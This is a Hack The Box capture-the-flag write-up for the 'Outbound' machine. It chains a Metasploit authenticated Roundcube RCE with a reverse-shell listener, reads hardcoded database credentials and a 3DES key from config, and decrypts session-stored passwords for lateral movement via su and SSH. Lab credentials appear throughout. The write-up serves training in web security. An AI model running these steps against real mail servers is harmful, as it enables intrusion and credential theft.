<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Z4B0-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Web_Security-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-CWES(Hack_The_Box)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-In_Progress-16a34a?style=flat-square" />

</div>

## Outbound — Hack The Box Write-Up

<div align="left">

![Category: Web](https://img.shields.io/badge/Category-Web-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

Outbound is an Easy Linux machine focused on **web exploitation, credential abuse, and cryptographic weaknesses**, demonstrating how authenticated RCE combined with poor secret management can lead to full system compromise.

- Authenticated Roundcube RCE
- Credential reuse & lateral movement
- 3DES session decryption abuse
- Docker environment awareness
- SSH pivot & user compromise

---

## 🛠 Tools

```
nmap              → service discovery & version detection
metasploit        → Roundcube authenticated RCE
mysql             → database enumeration
base64            → session decoding
python3           → 3DES-CBC decryption utility
ssh               → lateral movement validation
```

---

## 🔍 Reconnaissance & Enumeration

As with any structured engagement, enumeration begins with full port discovery.

### Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.236.51 -vvv -sCV
```

**Results:**

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
```

HTTP redirected to:

```text
http://mail.outbound.htb/
```

Add host locally:

```bash
echo '10.129.236.51 mail.outbound.htb outbound.htb' >> /etc/hosts
```

---

## 🌐 Web Enumeration

Browsing the application reveals a **Roundcube Webmail** login portal.

![image](images/login.png)

Initial credentials were provided:

```text
tyler : LhKL1o9Nm3X2
```

Login successful.

Version analysis indicates vulnerability to:

> Authenticated RCE via PHP Object Deserialization (Roundcube)

## ![image](images/about.png)

## 💥 Exploitation — Roundcube RCE

Using Metasploit module:

```bash
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set LHOST tun0
set LPORT 4444
set RHOSTS mail.outbound.htb
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
exploit
```

![image](images/about.png)

Successful session obtained:

```text
Server username: www-data
```

---

## 🐚 Post-Exploitation

### User Enumeration

```bash
ls /home
```

Discovered users:

```text
jacob
mel
tyler
```

Credential reuse confirmed:

```bash
su tyler
```

![image](images/tyler.png)

---

## 🐳 Environment Analysis

```bash
ls -la /
```

Presence of:

```text
.dockerenv
```

![image](images/docker.png)

Indicates containerized execution environment.

Docker does not provide security if secrets are exposed inside it.

---

## 🔐 Configuration Disclosure

Path identified:

```bash
/var/www/html/roundcube/config/config.inc.php
```

Critical findings:

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

Two major weaknesses:

- Hardcoded database credentials
- Static 24-byte DES encryption key

---

## 🗄 Database Enumeration

```bash
mysql -u roundcube -pRCDBPass2025
```

Query executed:

```sql
select * from session;
```

Session table contained Base64-encoded serialized data including encrypted password.

---

## 🔓 3DES-CBC Decryption

Decode session blob:

```bash
echo '<base64_string>' | base64 -d
```

Extracted encrypted password value:

```text
L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
```

Using the exposed 24-byte key with a 3DES-CBC decryption script:

```text
Key: rcmail-!24ByteDESkey*Str
```

Recovered plaintext password:

```text
595mO8DmwGeD
```

---

## 🔄 Lateral Movement — Jacob

```bash
su jacob
```

SSH validation:

```bash
ssh jacob@outbound.htb
```

![image](images/ssh.png)

Access confirmed.

---

## 📬 Mail Enumeration

Inbox path:

```bash
/home/jacob/mail/INBOX
```

Email disclosed updated password:

```text
gY4Wr3a1evp4
```

Another email indicated log inspection privileges were granted — suggesting further escalation vectors.

---

## 🚩 User Flag

```bash
cd /home/jacob
cat user.txt
```

## ![image](images/outband.png)

## 🧠 What This Machine Teaches

- Authenticated vulnerabilities remain critical
- Secret exposure inside config files is catastrophic
- Static crypto keys allow credential recovery
- Credential reuse accelerates compromise
- Containers are not security boundaries

---

## 📌 Conclusion

Outbound is a realistic example of how:

1. Valid credentials + authenticated RCE
2. Poor secret handling
3. Weak cryptographic implementation
4. Credential reuse

can be chained into full system compromise.

The attack required no brute force — only structured enumeration and logical pivoting.

> _If encryption keys are exposed, encrypted data is no longer protected._

---

This work is part of **FuzzRaiders’ structured hands-on training and research program**, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor, and real-world security execution

Happy hacking 🚀

# Author: Z4B0 [LinkedIn](https://www.linkedin.com/in/mahamud-abdirahman-151493375/)
